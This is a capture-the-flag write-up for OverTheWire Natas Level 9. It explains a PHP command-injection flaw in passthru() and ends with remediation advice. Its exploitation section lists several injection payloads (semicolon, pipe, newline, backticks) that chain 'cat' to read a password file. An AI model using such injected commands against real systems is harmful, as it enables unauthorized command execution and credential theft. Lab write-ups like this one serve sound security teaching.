---
title: "Level 9"
description: Exploiting unsanitized input passed to passthru() for command injection.
sidebarTitle: "Level 9 — Command Injection"
hidden: true
---

<!-- English content is temporarily disabled. Please refer to the Indonesian (id) version.

## Profile

- **Target:** `http://natas9.natas.labs.overthewire.org`
- **Credentials:** `natas9` / (password from Level 8)

## Reconnaissance

The page provides a search feature that appears to look through a dictionary. The PHP source reveals the underlying implementation:

```php
$key = $_REQUEST["needle"];

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```

The user input is interpolated directly into a shell command string without any sanitization.

## Analysis

PHP's `passthru()` function executes a command via the shell and passes the raw output through. Because user input is concatenated into the command string rather than passed as an argument, shell metacharacters are interpreted by the shell.

This is a classic **command injection** vulnerability (CWE-78). The `grep` command searches for the input pattern in `dictionary.txt`, but shell operators can be used to execute arbitrary commands.

## Exploitation

The semicolon `;` shell operator allows chaining multiple commands. Injecting:

```
; cat /etc/natas_webpass/natas10
```

Causes the shell to execute:

```bash
grep -i ; cat /etc/natas_webpass/natas10 dictionary.txt
```

This first runs `grep -i` with no pattern (which waits for stdin and produces no useful output), then executes `cat /etc/natas_webpass/natas10`, which prints the password for Level 10.

Alternative payloads using other shell operators:

- Pipe: `| cat /etc/natas_webpass/natas10`
- Newline: `\n cat /etc/natas_webpass/natas10`
- Backticks: `` `cat /etc/natas_webpass/natas10` ``

## Remediation

- Never pass user input directly to shell execution functions
- Use `escapeshellarg()` or `escapeshellcmd()` when shell execution is necessary
- Prefer language-native APIs over shell commands (e.g., PHP's `fopen()` instead of `cat`)

## References

- [OWASP: Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [PHP: passthru()](https://www.php.net/manual/en/function.passthru.php)

-->
